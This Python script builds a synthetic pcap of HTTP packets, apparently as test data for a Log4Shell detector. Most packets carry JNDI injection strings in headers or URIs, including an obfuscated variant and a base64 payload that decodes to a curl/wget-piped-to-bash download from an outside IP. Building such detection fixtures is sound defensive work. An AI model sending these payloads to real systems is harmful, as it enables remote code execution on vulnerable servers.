import os
import struct


def _ip_checksum(header: bytes) -> int:
    total = 0
    for i in range(0, len(header), 2):
        total += (header[i] << 8) + header[i + 1]
    while total >> 16:
        total = (total & 0xFFFF) + (total >> 16)
    return ~total & 0xFFFF


def _build_packet(ts_sec: int, ts_usec: int, src_ip: str, dst_ip: str,
                  src_port: int, dst_port: int, payload: bytes) -> bytes:
    eth = b'\x00' * 6 + b'\x00' * 6 + struct.pack('!H', 0x0800)
    src_ip_bytes = bytes(int(x) for x in src_ip.split('.'))
    dst_ip_bytes = bytes(int(x) for x in dst_ip.split('.'))
    ip_hdr = struct.pack('!BBHHHBBH', 0x45, 0, 0, 0, 0, 64, 6, 0) + src_ip_bytes + dst_ip_bytes
    ip_total_len = 20 + 20 + len(payload)
    ip_hdr = struct.pack('!BBHHHBBH', 0x45, 0, ip_total_len, 0, 0, 64, 6, 0) + src_ip_bytes + dst_ip_bytes
    cksum = _ip_checksum(ip_hdr)
    ip_hdr = struct.pack('!BBHHHBBH', 0x45, 0, ip_total_len, 0, 0, 64, 6, cksum) + src_ip_bytes + dst_ip_bytes

    seq, ack = 1000, 2000
    data_offset_flags = (5 << 4) | 0x18  # 5 words, ACK+PUSH
    tcp_hdr = struct.pack('!HHIIBBHHH', src_port, dst_port, seq, ack,
                          data_offset_flags, 0, 65535, 0, 0)
    packet_data = eth + ip_hdr + tcp_hdr + payload
    pkt_header = struct.pack('!IIII', ts_sec, ts_usec, len(packet_data), len(packet_data))
    return pkt_header + packet_data


def _http(method: str, path: str, ua: str, extra: str = "", host: str = "target.local") -> bytes:
    return (
        f'{method} {path} HTTP/1.1\r\n'
        f'Host: {host}\r\n'
        f'User-Agent: {ua}\r\n'
        f'{extra}'
        f'\r\n'
    ).encode()


PACKETS = [
    # 1: JNDI in URI
    _build_packet(100, 0, "10.0.0.5", "45.83.65.61", 49152, 80,
                  _http("GET", "/${jndi:ldap://45.83.65.61:1389/Exploit}", "Mozilla/5.0")),
    # 2: JNDI in User-Agent
    _build_packet(101, 0, "10.0.0.5", "198.71.247.91", 49153, 80,
                  _http("GET", "/", "${jndi:ldap://121.140.99.236:1389/Exploit}")),
    # 3: JNDI in Authorization header (Basic payload)
    _build_packet(102, 0, "175.6.210.66", "10.0.0.5", 49154, 80,
                  _http("GET", "/", "curl/7.58.0",
                        extra="Authorization: Basic ${jndi:ldap://121.140.99.236:1389/Exploit}\r\n")),
    # 4: Obfuscated JNDI
    _build_packet(103, 0, "10.0.0.6", "195.54.160.149", 49155, 80,
                  _http("GET", "/?x=${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://195.54.160.149:12344/a}",
                        "curl/7.68.0")),
    # 5: Base64 payload in POST body
    _build_packet(104, 0, "195.54.160.149", "10.0.0.5", 49156, 80,
                  _http("POST", "/", "curl/7.68.0",
                        extra="Content-Length: 409\r\n\r\n"
                        "${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/"
                        "KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xOTguNzEuMjQ3LjkxOjgwfHx3Z2V0IC1xIC1PLSAxOTUuNTQuMTYwLjE0OTo1ODc0LzE5OC43MS4yNDcuOTE6ODApfGJhc2g=}",
                        host="195.54.160.149")),
    # 6: Suspicious UA (python-requests) — true positive based on known patterns
    _build_packet(105, 0, "104.248.144.120", "10.0.0.6", 49157, 80,
                  _http("GET", "/callback", "python-requests/2.31")),
    # 7: Normal packet (true negative)
    _build_packet(106, 0, "10.0.0.5", "93.184.216.34", 49158, 80,
                  _http("GET", "/normal/page", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")),
    # 8: DNS-like JNDI (jndi:dns)
    _build_packet(107, 0, "10.0.0.6", "195.54.160.149", 49159, 80,
                  _http("GET", "/", "${jndi:dns://195.54.160.149:1389/securityscan-nlmvuu62bvi6yfl3}")),
]


def generate(output_path: str) -> str:
    with open(output_path, "wb") as f:
        f.write(struct.pack('!IHHiIII', 0xa1b2c3d4, 2, 4, 0, 0, 65535, 1))
        for pkt in PACKETS:
            f.write(pkt)
    return output_path


if __name__ == "__main__":
    output = os.path.join(os.path.dirname(__file__), "synthetic_jndi_test.pcap")
    generate(output)
    print(f"Generated: {output} ({os.path.getsize(output)} bytes, {len(PACKETS)} packets)")
